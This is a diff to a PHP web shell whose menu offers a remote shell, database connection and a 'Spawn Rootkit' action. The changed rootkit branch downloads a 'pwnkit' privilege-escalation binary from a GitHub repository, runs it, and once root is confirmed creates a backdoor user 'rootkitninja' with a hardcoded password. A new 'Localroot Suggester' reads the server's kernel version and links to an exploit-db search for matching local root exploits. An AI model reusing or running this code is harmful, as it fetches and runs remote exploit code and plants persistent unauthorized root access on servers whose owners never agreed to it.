@@ -88,6 +88,14 @@ function swd($s_p){
 	}
 	return trim($s_pu);
 }
+function suggest_exploit()
+{
+    $uname = php_uname();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    $pl = explode(".", $xpld[0]);
+    return $pl[0] . "." . $pl[1] . "." . $pl[2];
+}
 // htmlspecialchars, < > "
 function hss($s_t){
 	$s_n = array(">","<","\"");
@@ -2061,7 +2069,17 @@ if($s_auth){
 
 	// spawn rootkit
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='rootkit')){
-        $s_result .= exe("wget https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/main/rootkitninja.sh; chmod -R 0777 rootkitninja.sh; ./rootkitninja.sh");
+        exe("wget https://github.com/ortod0x/rootkitninja_webshell/raw/main/pwnkit -O pwnkit");
+		exe("chmod +x pwnkit");
+		exe('./pwnkit "id" > .rootkit_ninja');
+		$check_w00t = file_get_contents('.rootkit_ninja');
+		$is_inc = explode(" ", $check_w00t);
+		if($is_inc[0] == "uid=0(root)"){
+			exe('./pwnkit "useradd rootkitninja; echo -e "rootkitninja123\nrootkitninja123" | passwd rootkitninja"');
+			$s_result .= "Rooted, you can try login with username: rootkitninja & password: rootkitninja123";
+		} else {
+			$s_result .= "This device is not vulnerable, you can try using Localroot Suggester.";
+		}
 	}
 	
 	// task manager
@@ -2243,6 +2261,7 @@ if($s_auth){
 		<td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell' onclick='return false;'><div class='menumi'>Remote</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=db' title='Connect to database' onclick='return false;'><div class='menumi'>Connect</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=rootkit' title='Spawn Rootkit' onclick='return false;'><div class='menumi'>Spawn</div></a></td>
+		<td><a href='//www.exploit-db.com/search?q=Linux%20Kernel%20 <?php echo suggest_exploit();?>' title='Localroot Suggester' onclick='return false;'><div class='menumi'>Localroot Suggester</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=about' title='About Of Shell' onclick='return false;'><div class='menumi'>About</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=logout' title='Logout' onclick='return false;'><div class='menumi'>Logout</div></a></td>
 		</tr>
